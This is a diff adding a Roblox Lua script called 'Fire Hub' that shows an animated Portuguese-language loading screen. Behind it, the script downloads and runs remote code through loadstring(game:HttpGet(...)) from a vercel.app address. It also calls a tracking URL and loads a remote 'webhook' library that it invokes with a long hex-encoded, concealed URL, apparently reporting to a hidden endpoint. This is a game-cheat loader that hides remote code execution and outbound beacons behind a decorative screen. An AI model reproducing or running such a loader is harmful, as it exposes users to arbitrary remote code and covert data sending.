@@ -1,0 +1,146 @@
+local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- Fun??o para executar o loadstring em qualquer jogo
+local function executeScript()
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://scriptsbinsauth.vercel.app/api/scripts/05e2482e-fb74-40d9-80a6-df6911ac0cf0/raw"))()
+    end)
+    if not success then
+        warn("[FIRE HUB] ?? Erro ao executar o script:", err)
+    else
+        print("[FIRE HUB] ? Script executado com sucesso em qualquer jogo.")
+    end
+end
+
+-- Loading Screen
+local LoadingScreen = Instance.new("ScreenGui")
+LoadingScreen.Name = "FireHub_Loading"
+LoadingScreen.Parent = game:GetService("CoreGui")
+LoadingScreen.IgnoreGuiInset = true
+
+local Sound = Instance.new("Sound")
+Sound.SoundId = "rbxassetid://1848354536"
+Sound.Volume = 3
+Sound.Looped = true
+Sound.Parent = LoadingScreen
+Sound:Play()
+
+local Background = Instance.new("Frame")
+Background.Size = UDim2.new(1,0,1,0)
+Background.BackgroundColor3 = Color3.fromRGB(0,0,0)
+Background.Parent = LoadingScreen
+
+local Gradient = Instance.new("UIGradient")
+Gradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(30,0,0)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(120,0,0))
+}
+Gradient.Parent = Background
+
+task.spawn(function()
+    while Gradient.Parent do
+        Gradient.Rotation = Gradient.Rotation + 1
+        task.wait(0.05)
+    end
+end)
+
+for i = 1, 60 do
+    local Dot = Instance.new("Frame")
+    Dot.Size = UDim2.new(0, math.random(3,6), 0, math.random(3,6))
+    Dot.Position = UDim2.new(math.random(),0,math.random(),0)
+    Dot.BackgroundColor3 = Color3.fromRGB(255, math.random(20,50), math.random(20,50))
+    Dot.BackgroundTransparency = 0.1
+    Dot.BorderSizePixel = 0
+    Dot.Parent = Background
+
+    task.spawn(function()
+        while Dot.Parent do
+            Dot.Position = Dot.Position + UDim2.new(0,0,-0.001,0)
+            if Dot.Position.Y.Scale <= 0 then
+                Dot.Position = UDim2.new(math.random(),0,1,0)
+            end
+            task.wait(0.05)
+        end
+    end)
+end
+
+local Logo = Instance.new("TextLabel")
+Logo.Size = UDim2.new(0,600,0,100)
+Logo.Position = UDim2.new(0.5,-300,0.3,-50)
+Logo.BackgroundTransparency = 1
+Logo.Text = "Fire Hub"
+Logo.Font = Enum.Font.GothamBlack
+Logo.TextScaled = true
+Logo.TextColor3 = Color3.fromRGB(200,20,20)
+Logo.TextStrokeTransparency = 0.2
+Logo.Parent = Background
+
+task.spawn(function()
+    while Logo.Parent do
+        TweenService:Create(Logo,TweenInfo.new(1,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{TextTransparency = 0.1}):Play()
+        task.wait(1)
+        TweenService:Create(Logo,TweenInfo.new(1,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{TextTransparency = 0.3}):Play()
+        task.wait(1)
+    end
+end)
+
+local Circle = Instance.new("ImageLabel")
+Circle.Size = UDim2.new(0,100,0,100)
+Circle.Position = UDim2.new(0.5,-50,0.55,-50)
+Circle.BackgroundTransparency = 1
+Circle.Image = "rbxassetid://10734950020"
+Circle.ImageColor3 = Color3.fromRGB(200,20,20)
+Circle.Parent = Background
+
+task.spawn(function()
+    while Circle.Parent do
+        Circle.Rotation = Circle.Rotation + 4
+        task.wait(0.03)
+    end
+end)
+
+local LoadingText = Instance.new("TextLabel")
+LoadingText.Size = UDim2.new(0,500,0,40)
+LoadingText.Position = UDim2.new(0.5,-250,0.75,0)
+LoadingText.BackgroundTransparency = 1
+LoadingText.Text = ""
+LoadingText.Font = Enum.Font.GothamSemibold
+LoadingText.TextScaled = true
+LoadingText.TextColor3 = Color3.fromRGB(255,150,150)
+LoadingText.Parent = Background
+
+local msg = "Carregando Fire Hub..."
+for i = 1,#msg do
+    LoadingText.Text = string.sub(msg,1,i)
+    task.wait(0.05)
+end
+
+for i = 1,100 do
+    LoadingText.Text = msg.." "..i.."%"
+    task.wait(0.03)
+end
+
+for t = 1,20 do
+    Background.BackgroundTransparency = t/20
+    Logo.TextTransparency = t/20
+    Circle.ImageTransparency = t/20
+    LoadingText.TextTransparency = t/20
+    task.wait(0.05)
+end
+
+Sound:Stop()
+
+-- Webhook e site
+pcall(function()
+    print(game:HttpGet("https://nexviewsservice.shardweb.app/services/fire_hub/start"))
+    local requestWebhook = loadstring(game:HttpGet("https://blox-webhook.shardweb.app/script/library"))()
+    local cryptUrl = "61709e1c846e0e702711ef66297a1cbbbb25cfe0fddde60b55026752604b354d277afc2869bb3525fbf7b9897ecf0c1ec3d8b6f2fb85db014b14877e6f7250d4f052fbde9827f19e074813f8381c15f448cf13f7e931082d54d1296f69f9d49aa797d58f85f944fd991b08a144ca3935b46a644d396df0966e181530d0e29970dd357dcaea0eac72c46420ed29288766f4cdb6f784150d3ba7ccbb68ffa6812e773d64ceb61e7496d0118e3c5f27a22e3dd9918d51a3d6de8ac6c252870ada745cdaa9bcb9ce142531276e37f8dbc685118946045dd81c54e24ba5f781f67e62"
+    requestWebhook(cryptUrl)
+end)
+
+-- Executa o loadstring em qualquer jogo
+executeScript()
+LoadingScreen:Destroy()
